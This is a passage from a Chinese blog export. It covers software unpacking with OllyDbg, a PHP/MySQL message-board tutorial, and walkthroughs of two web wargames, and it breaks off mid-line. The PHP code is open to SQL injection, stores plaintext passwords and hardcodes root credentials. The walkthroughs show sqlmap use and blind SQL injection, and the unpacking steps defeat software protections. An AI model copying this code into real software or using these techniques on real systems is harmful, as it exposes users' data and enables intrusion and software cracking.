rdtsc\n```\n\n接下来遇到这一语句，注释和信息窗口都显示0040开头，是我们的用户代码段，这里把指令转换，还原我们的真实地址。\n\n```asm\n009F03DA    8B6D 00         mov ebp,dword ptr ss:[ebp]               ; UnPackMe.00401615\n```\n\n即在被抽取代码段中添加`call 00401615`。\n\n运行到这不要retn，F4运行到jmp处，继续F8单步走。\n\n```asm\n009F0402    C3              retn\n009F0403    EB 04           jmp short 009F0409\n```\n\n提取最后一句被抽取代码，retn去到伪OEP`401504`处。\n\n```asm\n009F0409    90              nop\n009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx;最后一句被抽取的代码\n009F0410    68 04154000     push 0x401504\n009F0415    C3              retn\n```\n\n总结一下被抽取的代码：\n\n```asm\npush ebp\nmov ebp esp\npush -1\npush 004023D0\npush 00401616\n009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]\n009F0234    50              push eax\n009F0235    64:8925 0000000>mov dword ptr fs:[0],esp\n009F023C    83EC 68         sub esp,0x68\n009F023F    53              push ebx\n009F0240    56              push esi                                 ; UnPackMe.00404038\n009F0241    57              push edi                                 ; UnPackMe.00407B90\n009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n009F0245    33DB            xor ebx,ebx\n009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx\ncall 00401615\n009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx\n```\n\n去到伪OEP，如果看到全是字节，右键 -> Analysis -> remove analysis from module 。这样就可以看到汇编代码了。\n\n```asm\n00401504   /75 0C           jnz short UnPackMe.00401512\n00401506   |68 12164000     push UnPackMe.00401612\n0040150B   |FF15 6C214000   call dword ptr ds:[0x40216C]             ; msvcrt.__setusermatherr\n00401511   |59              pop ecx                                  ; UnPackMe.00407B90\n00401512   \\E8 E9000000     call UnPackMe.00401600\n```\n\n往上拉发现代码被混淆，先不管。拉到retn下面的一句，也就是`4014A7`处，往下NOP到伪代码处。(后来发现4014A7不够，4014A6也需要NOP掉)\n\n```asm\n004014A1    c2 2513         retn 0x1325\n004014A4  ^ E3 A5           jecxz short UnPackMe.0040144B\n004014A6    cb              retf\n004014A7    7B D5           jpo short UnPackMe.0040147E\n004014A9    64:03d4         add edx,esp\n004014AC    3F              aas\n```\n\n发现`401504`也被NOP掉了，选中被NOP掉的前3行右键 -> Undo selection ，还原代码。\n\n```asm\n00401504    90              nop\n00401505    90              nop\n00401506    90              nop\n00401507    1216            adc dl,byte ptr ds:[esi]\n00401509    40              inc eax\n```\n\n接下来我们去段首可以选择二进制粘贴的形式，也可以采取逐一汇编的方式进行修改。\n\n二进制代码如下：\n\n```asm\n55 8B EC 6A FF 68 D0 23 40 00 68 16 16 40 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68\n53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 7C 21 40 00 59 83 0D 3C 31 40 00 FF 83 0D 40 31 40\n00 FF FF 15 78 21 40 00 8B 0D 30 31 40 00 89 08 FF 15 74 21 40 00 8B 0D 2C 31 40 00 89 08 A1 70\n21 40 00 8B 00 A3 38 31 40 00 E8 17 01 00 00 39 1D 50 30 40 00\n```\n\n选中所有NOP二进制粘贴，新建EIP，运行loadPE和importREC，修正指针，脱壳成功。\n\n## 7.13  未知壳\n\n### 7.13.1 PolyBox\n\n这个是个捆绑壳，意思是伪装成其他类别的壳，加大脱壳的难度。\n\nPEID查壳显示FSG壳，这种壳用了FSG的外衣，把要加壳的程序当成一种资源加密起来。\n\n用FSG专用的ESP定律找到第2层壳的OEP。\n\n```asm\n00402F18    55              push ebp\n00402F19    8BEC            mov ebp,esp\n00402F1B    83C4 F0         add esp,-0x10\n00402F1E    B8 C02E4000     mov eax,UnPackMe.00402EC0                ; ASCII \"\\n\"\n```\n\n在命令窗口输入`bp WriteProcessMemory`。`WriteProcessMemory`是读取程序的大小，也可以解释为处理写入的数据。F9运行，程序停在dll领空，查看堆栈窗口，它给程序写入了起始地址为`3D0000`的程序。\n\n```asm\n0012FDE4   0040201B  /CALL 到 WriteProcessMemory 来自 UnPackMe.00402016\n0012FDE8   00000048  |hProcess = 00000048 (window)\n0012FDEC   00400000  |Address = 0x400000\n0012FDF0   003D0000  |Buffer = 003D0000\n0012FDF4   00001000  |BytesToWrite = 1000 (4096.)\n0012FDF8   0012FF48  \\pBytesWritten = 0012FF48\n0012FDFC   0012FE08  指向下一个 SEH 记录的指针\n```\n\n用LoadPE找到进程，右键->区域转存，找到起始地址为`3D0000`的区域转存，后缀名改为exe即可运行。\n\n### 7.13.2 UPX(Stolen Code) \n\n单步和ESP定律都不太行，用两次内存镜像到达一串jmp指令的地方。\n\n```asm\n004014E4  - FF25 1C204000   jmp dword ptr ds:[<&MFC42.#CWinApp::InitApplication_3922>]                ; mfc42.#CWinApp::InitApplication_3922\n004014EA  - FF25 20204000   jmp dword ptr ds:[<&MFC42.#CWinApp::AddToRecentFileList_1089>]            ; mfc42.#CWinApp::AddToRecentFileList_1089\n```\n\n很明显这是由MFC写的程序，拿一个完整的MFC程序做对比。\n\n```asm\n0040163D     C3                        RETN\n0040163E   - FF25 94214000             JMP DWORD PTR DS:[<&msvcrt.__CxxFrameHandler>]  \n00401644     CC                        INT3\n00401645     CC                        INT3\n0040164F     CC                        INT3\n00401650   - FF25 90214000             JMP DWORD PTR DS:[<&msvcrt._except_handler3>]   \n00401656     55                        PUSH EBP;这里是OEP\n00401657     8BEC                      MOV EBP,ESP\n00401659     6A FF                     PUSH -1\n0040165B     68 E0234000               PUSH 004023E0\n00401660     68 50164000               PUSH <JMP.&msvcrt._except_handler3>             \n00401665     64:A1 00000000            MOV EAX,DWORD PTR FS:[0]\n```\n\n被偷代码的程序：\n\n```asm\n004016F5    C3              retn\n004016F6  - FF25 A4214000   jmp dword ptr ds:[<&MSVCRT.__CxxFrameHandler>]               ; msvcrt.__CxxFrameHandler\n004016FC    CC              int3\n004016FD    CC              int3\n004016FE    CC              int3\n004016FF    CC              int3\n00401700    98              cwde\n00401701    e5 27           in eax,0x27\n00401703    69AB ED2F71B3 0>imul ebp,dword ptr ds:[ebx-0x4C8ED013],0xC6844200\n0040170D    084A 64         or byte ptr ds:[edx+0x64],cl\n00401710    A1 00000000     mov eax,dword ptr ds:[0]\n```\n\nOEP前面的代码都是一样的，所以我们要找`<&msvcrt._except_handler3>`函数的地址。查看与它同模块的`<&MSVCRT.__CxxFrameHandler>`的地址(双击即可查看)为`4021A4`，在命令窗口输入`d 4021A4`回车。\n\n```asm\n00402194 >77C05C94  msvcrt._except_handler3\n00402198 >77C1EE4F  msvcrt._controlfp\n0040219C >77C04DF8  msvcrt._onexit\n004021A0 >77C04E51  msvcrt.__dllonexit\n004021A4 >77BF27FA  msvcrt.__CxxFrameHandler\n```\n\n很容易找到`<&msvcrt._except_handler3>`的地址为`402194`，然后是入口代码，都一样的，只有两个下面的push指令不一样。因为第二个push也刚好是`<&msvcrt._except_handler3>`函数地址，所以我们只需找第一个push的地址。\n\n把堆栈窗口的滚动条往下拉到底(因为最先压栈的在最底部)，从下往上看，找到第一个压入的程序函数，就是我们第一个push进去的地址。\n\n```asm\n0012FFD0   0012FFE0  指向下一个 SEH 记录的指针\n0012FFD4   00401886  SE处理程序\n0012FFD8   00402500  UnPackMe.00402500;程序函数，所以是这个\n0012FFDC   00000000\n0012FFE0   0012CFA0  指向下一个 SEH 记录的指针\n0012FFE4   7C839AD8  SE处理程序\n0012FFE8   7C817080  返回到 kernel32.7C817080;这个是系统函数，不是\n0012FFEC   00000000\n0012FFF0   00000000\n0012FFF4   00000000\n0012FFF8   00407000  UnPackMe.<ModuleEntryPoint>;这个是入口点\n0012FFFC   00000000\n```\n\n还有最后一句，正常程序的代码为`64:A1 00000000`，而加壳程序的代码与上面一句混淆了，所以也要将它修改为`64:A1 00000000`。\n\n将代码拼凑起来，由于中间的代码不够用，所以把第1行jmp去掉，因为其它代码都是入口点必须的。\n\n```asm\njmp 402194;去掉\npush ebp\nmov ebp,esp\npush -1\npush 402500\npush 402194\nmov eax,dword ptr fs:[0]\n```\n\n```asm\n00401700    55              push ebp;将此处设置为新EIP\n00401701    8BEC            mov ebp,esp\n00401703    6A FF           push -0x1\n00401705    68 00254000     push UnPackMe.00402500\n0040170A    68 94214000     push <&MSVCRT._except_handler3>\n0040170F    64:A1 00000000  mov eax,dword ptr fs:[0]\n```\n\n这时用ODdump说“不能创建程序”，用LoadPE也不能抓取进程，是因为这个程序由反调试功能。用任务管理器将程序进程结束，再在OD用ODdump即可。\n\n### 7.13.3 yoda's Protector 1.03.3\n\nPEID说是这个壳，但也不知道是不是。OD载入\n\n```asm\n0040A6ED >  E8 03000000     call UnPackMe.0040A6F5\n0040A6F2    EB 01           jmp short UnPackMe.0040A6F5\n0040A6F4    E9 BB550000     jmp UnPackMe.0040FCB4\n```\n\n忽略除非法内存访问的所有异常，在StrongOD中取消勾选“跳过某些异常”。重载，F9运行。程序停在空白代码处。\n\n方法一：此时堆栈窗口显示\n\n```asm\n0012EBE0   0012EC70  指向下一个 SEH 记录的指针\n0012EBE4   0040CA2C  SE处理程序\n```\n\n在反汇编窗口Ctrl+G，跟随SE句柄。F2下断，Shift+F9运行，取消断点。\n\n```asm\n0040CA2C    55              push ebp\n0040CA2D    8BEC            mov ebp,esp\n0040CA2F    57              push edi\n```\n\nF8往下，走到此处EDI的值就是OEP。\n\n```asm\n0040CA55    3E:89B8 B800000>mov dword ptr ds:[eax+0xB8],edi          ; UnPackMe.00401700\n```\n\nCtrl+G跟随`401700`到达OEP。脱壳，一定要修正镜像大小。这个程序是有涉及到锁键盘、锁任务栏的，但可以用这种方法巧妙绕过。\n\n方法二：在`M`模块`.text`处下断，Shift+F9也能运行到\n\n```asm\n0040CA2C    55              push ebp\n0040CA2D    8BEC            mov ebp,esp\n0040CA2F    57              push edi\n```\n\n往后操作一样。\n\n","categories":["Windows逆向"],"tags":["脱壳","吾爱破解培训"]},{"title":"创建留言板","url":"/posts/b80b3bc2.html","content":"//在Ubuntu环境下后端用MySQL，前端用HTML和PHP\n\n```\nsudo su\t//进入根目录\nmysql -uroot -p123456\t//进入MySQL\n```\n\n数据库和文件一定要在同一主机，并且将文件放在/var/www/html下，打开文件要走apache，即要在URL上输入路径，不能直接打开本地的html文件。\n\n<!--more-->\n\n# 1. 创建数据库和基本表\n\n```mysql\ncreate database commentDB;\nuse commentDB;\ncreate table user(\n    username char(20),\n    password char(20) not null,\n    email char(30),\n    primary key(username));\ncreate table u_c(\n    username char(20) not null,\n    comment varchar(100),\n    foreign key(username) references user(username));\n```\n\n# 2. 设置注册界面\n\nregister.html\n\n```html\n<html>\n    <head>\n        <meta charset=\"utf-8\">\n        <title>用户注册</title>\n    </head>\n    <body>\n        <form method=\"post\" action=\"register.php\">\n            <!--用post方法提交表单不会将用户输入的信息显示在URL上-->\n            <!--点击提交按钮后执行register.php-->\n            用户名：<input type=\"text\" name=\"username\"><br/>\n            密码：<input type=\"password\" name=\"password\"><br/>\n            邮箱：<input type=\"text\" name=\"email\" placeholder=\"填写邮箱便于重置密码\"><br/>\n            <!--type为password，用户输入不会显示实际字符，用黑圆点代替-->\n            <!--name是给这个输入起个名字，在php中要用到-->\n            <!--还想设置带*号是必填，用户名和密码是必填，但不会-->\n     \t\t<input type=\"submit\" value=\"注册\">       \n        </form>\n    </body>\n</html>\n```\n\nregister.php\n\n```php\n<?php\n//创建连接\n$conn = mysqli_connect(\"localhost\",\"root\",\"123456\");\n//检测连接\nif(!$conn)\n    die(\"连接失败：\".mysqli_error($conn));\nmysqli_query($conn, \"set names utf8\");//设置编码，防止中文乱码\n$username = $_POST[\"username\"];//$_POST[]里面的参数即为html中的name\n$password = $_POST[\"password\"];\n$email = $_POST[\"email\"];\n$sql = \"insert into user\".\"(username, password, email)\".\"values\".\"('$username','$password','$email')\";//编写插入语句\nmysqli_select_db($conn,'commentDB');//选择数据库\n$retval = mysqli_query($conn, $sql);//执行插入语句\nif(!$retval)\n    die('插入数据失败:'.mysqli_error($conn));\nsetcookie(\"username\", $username);\nmysqli_close($conn);//关闭数据库连接\nheader(\"location:comment.html\");//跳转至评论界面\n?>\n```\n\n# 3. 设置登录界面\n\nlogin.html\n\n```html\n<html>\n    <head>\n        <meta charset=\"utf-8\">\n        <title>用户登录</title>\n    </head>\n    <body>\n        <form method=\"post\" action=\"login.php\">\n            用户名：<input type=\"text\" name=\"username\"><br/>\n            密码：<input type=\"password\" name=\"password\"><br/>\n            <input type=\"submit\" value=\"登录\">       \n        </form>\n        <a href=\"register.html\">注册</a>\n    </body>\n</html>\n```\n\nlogin.php\n\n```php\n<?php\n$conn = mysqli_connect(\"localhost\",\"root\",\"123456\");\nif(!$conn)\n    die(\"连接失败：\".mysqli_error($conn));\nmysqli_query($conn, \"set names utf8\");\n$username = $_POST[\"username\"];\n$password = $_POST[\"password\"];\n//判断用户密码是否为空\nif($username == \"\")\n{\n    echo '<script>alert(\"请输入用户名！\");</script>';\n    exit(0);\n}\nelse if($password == \"\")\n{\n    echo '<script>alert(\"请输入密码！\");</script>';\n    exit(0);\n}\n//检测数据库中用户是否存在\nmysqli_select_db($conn,'commentDB');\n$sql = \"select username, password from user where username='$username' and password='$password';\";\n$result = mysqli_query($conn, $sql);\n$flag = mysqli_fetch_array($result);\n//登录成功跳转评论页面\nif($flag)\n{\n    setcookie(\"username\", $username);//将登录信息放入cookie\n    header(\"location:comment.html\");\n}\nelse\n    echo '<script>alert(\"用户名或密码错误！\");</script>';\nmysqli_close($conn);\n?>\n```\n\n# 4. 设置留言板界面\n\ncomment.html\n\n```html\n<html>\n    <head>\n        <meta charset=\"utf-8\">\n        <title>留言板</title>\n    </head>\n    <body>\n        <form method=\"post\" action=\"comment.php\">\n            <p>留言板<textarea name=\"comment\"></textarea></p>\n            <p><input type=\"submit\" value=\"留言\"></p>\n        </form>\n    </body>\n</html>\n```\n\ncomment.php\n\n```php\n<?php\n$conn = mysqli_connect(\"localhost\",\"root\",\"123456\");\nif(!$conn)\n    die(\"连接失败：\".mysqli_error($conn));\nmysqli_query($conn, \"set names utf8\");\n$username = $_COOKIE[\"username\"];\n$comment = $_POST[\"comment\"];\n$sql = \"insert into u_c\".\"(username, comment)\".\"values\".\"('$username','$comment')\";\nmysqli_select_db($conn,'commentDB');//选择数据库\n$retval = mysqli_query($conn, $sql);//执行插入语句\nif(!$retval)\n    die('插入数据失败:'.mysqli_error($conn));\nelse\n    echo '<script>alert(\"留言成功！\");</script>';\nmysqli_close($conn);//关闭数据库连接\n?>\n```\n\n","categories":["开发"],"tags":["PHP","MySQL"]},{"title":"黑客丛林之旅小游戏","url":"/posts/9589547b.html","content":"[黑客丛林之旅](http://www.fj543.com/hack/)\n\n1-http://www.fj543.com/hack/?level=1\n\n> 提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) \n\n<!--more-->\n\n```html\n<script type=\"text/javascript\">\nfunction gogogo(){\n\tvar pwd=document.getElementById(\"pass\").value;\n\tif (pwd==\"go8990\") {alert(\"OK,过关了！\");window.location=\"./?level=222\";} else {alert(\"Error:密码错误！\");document.getElementById(\"pass\").focus();}\n}\n</script>\n```\n\n2-http://www.fj543.com/hack/?level=222\n\n> 提示语：这讨厌的脚本，为什么阻止我！(I hate the script,it prevents me) \n\n```html\n<script type=\"text/javascript\">\nfunction chkPassword(){\n\tvar pwd=document.getElementById(\"pass\").value;\n\tif (pwd==\"\") {alert(\"Error:密码不能为空！(Input password please)\");}else{alert(\"Error:密码不能填东西！(Don't input password please)\");} //无论输入什么内容,就是不让你提交！\n\treturn false;\n}\n</script>\n<form action=\"./\" method=\"post\" onsubmit=\"return chkPassword()\">\n输入密码进入下一关 (Input password please)<br>\n<input type=\"password\" name=\"pass\" id=\"pass\" value=\"\">\n<input type=\"hidden\" name=\"act\" id=\"act\" value=\"pass2\">\n<input type=\"submit\" value=\"Go\">\n</form>\n```\n\nscript标签里的东西改不了，将表单的`return chkPassword()`删掉即可。\n\n3-http://www.fj543.com/hack/?level=3login\n\n> 您还没有登录，所以看不到本页的秘密。(You must login to see the secret of this level) \n>\n> 提示语：这该死的网页，凭什么说我没有登录？(Damn page! Why you say that I didn't login?)  \n\n在cookie管理器或抓包改cookie，no改成yes即可。\n\n```\nCookie: ASPSESSIONIDCSSDDSRA=KDLFDAJCJMFKCDDFPJOBMEFA; Hm_lvt_ddc172cd878cb9d6da5a109ab508be16=1631447102; Hm_lpvt_ddc172cd878cb9d6da5a109ab508be16=1631447282; guoguan=2; login=no\n```\n\n4-http://www.fj543.com/hack/?level=4ditdah\n\n```\n. .\n. _\n_ _\n_ _ _\n_ . _\n提示语：向嘀嗒嘀嗒的电子时代老一辈黑客们致敬。(Tribute to the early hackers)  \n```\n\n 摩斯电码`IAMOK`\n\n5-http://www.fj543.com/hack/?level=5crack\n\n> 提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw==或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  \n\n`YmFzZTY0aXNvaw==`有大小写和等号，考虑base64`base64isok`\n\n`ad93c1d102ae60f4`是MD5`520530`，但用`520530`过不了关？？？\n\n6-http://www.fj543.com/hack/?level=6por\n\n>  if mstsc+vnc=9290 then password=MSSQL+MySQL+Oracle\n>  password= ？\n>\n>  提示语：有些常见的数字要记住。(You should remember some numbers)  \n\n常见端口号：\n\n```\nmstsc:3389\nvnc:5901\nMSSQL:1433\nMySQL:3306\nOeacle:1521\n```\n\npassword=1433+3306+1521=6260\n\n7-http://www.fj543.com/hack/?level=75901\n\n> 提示语：眼花缭乱了吧，看电视的时候怎么不会啊！(The password is about a TV program)  \n\n一张GIF动图，拿去`Stegsolve`把它拆了analyse->frame browser，拆成6张图，组合起来为`8bIGNOREwmUPPERCASEqneWORDS`，大写字母的意思是`ignore upper words`忽略大写字母，所以正确答案为`8bwmqne`。\n\n8-http://www.fj543.com/hack/?level=8bwmqne\n\n> 吴世昌的弟弟的网名是什么？(What's the username of WuShichang's little brother) \n>\n> 提示语：小小社工，过这一关主要靠人脑，电脑只是辅助。(Social Engineering.Use your brain more,and use computer less) \n\n吴世昌的弟弟叫吴其昌，吴世昌的网名fj543，推测吴其昌的网名为`fj573`\n\n9-http://www.fj543.com/hack/?level=91ie543\n\n> 提示语：使用IE 5.43版本的浏览器访问?level=9token可以得到令牌。(Use IE 5.43 version to browse ?level=9token) \n\n抓包改URL和浏览器\n\n```\nGET /hack/?level=91ie543 HTTP/1.1\nHost: www.fj543.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\n```\n\n改为\n\n```\nGET /hack/?level=9token HTTP/1.1\nHost: www.fj543.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 IE 5.43\n```\n\n` 您的令牌(Token):level9495216 `\n\n回到原来的URL输入令牌。\n\n10-http://www.fj543.com/hack/?level=g1012495216\n\n> 提示语：请下载[令牌生成器(Token Generator)](http://www.fj543.com/hack/files/10token.zip)。解压密码不长,但很复杂。(Download it.The zip password is short,but very complex)  \n\n去winhex查一下是不是真加密，真加密就爆破zip，结果为`o0_O`。输入密码，执行exe程序生成口令。但当我们点击`aux.10.txt`后它说找不到文件，用什么文字编辑器都打不开。wp说它属于特殊文件名，只能用cmd打开：\n\n```\n#type指令打开常规方法无法打开的文件\ntype \\\\.[txt文件的绝对路径]\ntype \\\\.\\C:\\Users\\dell\\Desktop\\10token\\aux.10.txt\n你的令牌(Token):key104957591\n只在今天有效(It's available only today)\n```\n\n11-http://www.fj543.com/hack/?level=lv11\n\n> 提示语：一个表情，却是有声有色。(I like the beautiful face and the voice) \n\n用winhex打开看到字符串\n\n> GIF89a……--------------------password end,and password start--------------------RIFF$WAVEfmt\n\n前面是GIF图片，后面RIFF$WAVEfmt是音频文件格式。用winhex将前面的GIF部分删除，剩下的另存为.wav文件，音频说`表情加上6688`，我的是微笑表情，所以`smile6688`通过。\n\n12-http://www.fj543.com/hack/?level=g1213495759\n\n> 您需要获取两个临时ID的认证，才能看到本关的秘密！(You should get two Authentication)\n> 1.下载第12关认证软件，用它申请认证一个软件临时ID.(Download it. And use it to Authenticate the TempID of software)\n> 2.回到此窗口，想办法手工申请认证你的网页临时ID.(Then back to this window.Try to Authenticate the TempID of web)\n>\n> 提示语：你的网页临时ID是191.半小时内有效，若失效请刷新网页。(This is your TempID of web) \n\n下载解压后win10一定一定要以管理员身份运行，否则根本打不开！\n\n> 临时ID：455\n>\n> 在线认证开始(Started)\n>\n> 验证第一步(step1)...Step1 ok\n>\n> 验证第二步(step2)...Step2 ok\n>\n> 已完成软件临时ID的认证。接下来请回到浏览器中申请网页临时ID的认证。(Software TempID is authenticated.Please back to the browser window.Try to Authenticate the TempID of web)\n\n什么都没有，就给了个临时ID，先用winhex打开看看\n\n> User-Agent: Mozilla/4.0 (compatible; HackersGameBrowser)\n>\n> http://www.fj543.com/hack/  寶翄,{Nek(step1)  ?act=step1&code=  寶翄,{孨ek(step2)  ?act=step2&code=  step1ok step2ok\n\n可以看到关键信息`?act=step1&code=`和`?act=step2&code=`，提交链接应该就是这些。\n\n先把刚才的软件临时ID构造`http://www.fj543.com/hack/?act=step1&code=455`，但会出现以下错误：\n\n> Error:你的临时ID应该是162.(Your TempID should be this one) \n\n抓包把User-Agent换成上面那个就可以了。\n\n>  Step1 ok \n\n接下来获取第二个临时ID，猜测`http://www.fj543.com/hack/?act=step2&code=455`显示\n\n>  Error:Bad Code \n\n现在已知code总是3位数，那就直接爆破。有些code都返回了`Step2 ok`但怎么进去下一关啊？感觉是bug。找到状态302，就是正确code，在URL上打就刷新出第13关入口。\n\n13-http://www.fj543.com/hack/?level=13sql\n\n> 你的ID是(Your ID)： 154 \n> 你的密码(Your password)： \n>\n> 提示语：请从/hack/13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  \n\n去到http://www.fj543.com/hack/13sql.asp\n\n> 这是一个数据库信息查证页面，提交一个ID，会显示查询结果。(Submit an ID,then it will show you the query result)\n>\n> 数据库中有这条信息,但我不能直接告诉你密码。(The data exists.But I can't show you the password)  \n\nPOST形式的SQL注入，也可以用sqlmap自动化注入，参数可以抓包看\n\n```\nsqlmap -u http://www.fj543.com/hack/13sql.asp --data=\"id=154&password=111\" --batch\nsqlmap -u http://www.fj543.com/hack/13sql.asp --data=\"id=154&password=111\" --batch --tables\n```\n\n自动化注入好像不行，开始手注。\n\n输入1\n\n>  数据库中有这条信息,但我不能直接告诉你密码。 \n\n输入1 and 1=1\n\n>  数据库中有这条信息,但我不能直接告诉你密码。 \n\n输入-1\n\n>  没有找到此ID对应的内容。 \n\n输入-1 or 1=1\n\n>  数据库中有这条信息,但我不能直接告诉你密码。 \n\n反正就不告诉我，普通手注从网页中返回不了有效信息，大佬们wp中的思路：猜密码的字段名为pwd，构造`154 and pwd like '%a%'`，抓包，将\\$a$暴力破解。我猜意思是pwd是由暴力破解得出的字符组成的。\n\n> id=154+and+pwd+like+%27%25a%25%27\n>\n> id=154+and+pwd+like+%27%25\\$a$%25%27\n\n破解发现`bdguvBDGUV`都有，我猜密码是5个字符，不区分大小写。\n\n```python\nimport itertools\nf = open(\"bdguv.txt\", \"w\")\n\nfor i in itertools.permutations('bdguv', 5):\n    c = ''.join(i)\n    f.write(c+'\\n')\n\nf.close()\n```\n\n回到`http://www.fj543.com/hack/?level=13sql`抓包，设置参数用bdguv.txt爆破。返回状态302的即是正确密码。\n\n14-http://www.fj543.com/hack/?level=14crack\n\n令牌下载下来的名字`file.exe.html`，将html删去，运行一下，让我们输入密码。扔去OD看看字符串：右键->中文搜索引擎->智能搜索\n\n可以看到一些奇怪的字符串，组合起来为`love543`，估计这个就是密码，输入就可得到令牌。\n\n通关。","categories":["综合"],"tags":["CTF","Web"]},{"title":"monyer闯关小游戏","url":"/posts/76c5464c.html","content":"[梦之光芒](http://monyer.com/game/game1) \n\n查看源码，发现有个链接链接到first.php，进入第1关\n\n1-http://monyer.com/game/game1/first.php\n\n<!--more-->\n\n```html\n<script type=\"text/javascript\">\n    function check(){\n        if(document.getElementById('txt').value==\"  \"){\n            window.location.href=\"hello.php\";\n        }else{\n            alert(\"密码错误\");\n        }\n    }\n</script>\n```\n\n发现密码是两个空格，意思就是说我们在id=txt那一栏填入两个空格，就可以跳转到hello.php；或者直接改URL到hello.php\n\n2-http://monyer.com/game/game1/hello.php\n\n```html\n<script type=\"text/javascript\">\n    document.oncontextmenu=function(){return false};\n    var a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d / c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n\n    function check(){\n        if(document.getElementById(\"txt\").value==a){\n            window.location.href=a + \".php\";\n        }else{\n            alert(\"密码错误\");\n            return false;\n        }\n    }\n</script>\n```\n\nMath.floor()向下取整，JavaScript的**/**运算符算到小数`5/2=2.5`。\n\n把那一串代码改改随便拿去哪个语言环境跑跑得出结果。\n\n3-http://monyer.com/game/game1/424178.php\n\n```html\n<script type=\"text/javascript\">   \n  eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n</script>\n```\n\nfromCharCode()将Unicode编码转为一个字符，静态 **`String.fromCharCode()`** 方法返回由指定的 UTF-16 代码单元序列创建的字符串。将里面的代码找个在线JavaScript一转，摇身一变代码：\n\n```javascript\nconsole.log(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n---------------------------------------------------\nfunction check(){\n\tvar a = 'd4g';\n\tif(document.getElementById('txt').value==a){\n\t\twindow.location.href=a+\".php\";\n\t}else{\n\t\talert(\"密码错误\");\n\t}\n}\n```\n\n4-http://monyer.com/game/game1/d4g.php\n\n输入`d4g`时，看到URL转到`d4g.php`又很快回到了第3关的URL，那只能抓包来看看它返回了什么东西。\n\n```html\n<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n<meta name=\"robots\" content=\"noindex,nofollow\">\n<meta http-equiv=\"refresh\" content=\"0;url=424178.php\">\n<title>梦之光芒/Monyer——Monyer's Game(第4关)</title>\n<script type=\"text/javascript\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n</head>\n<body>\n<div align=\"center\">\n    <p>欢迎您来到第4关</p>\n    <p>请输入密码进入第5关：\n        <input type=\"text\" id=\"txt\" value=\"\">\n        <input type=\"button\" onClick=\"check()\" value=\"提交\">\n    </p>\n</div>\n</body>\n<script type=\"text/javascript\">\n    eval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n</script>\n</html>\n```\n\n可以看到有两段script，分别将两段script解密：\n\n```html\n<script type=\"text/javascript\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n----------------------------------------------------\nconsole.log(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}));\n-----------------------------------------------------\na=\"3bhe\";function 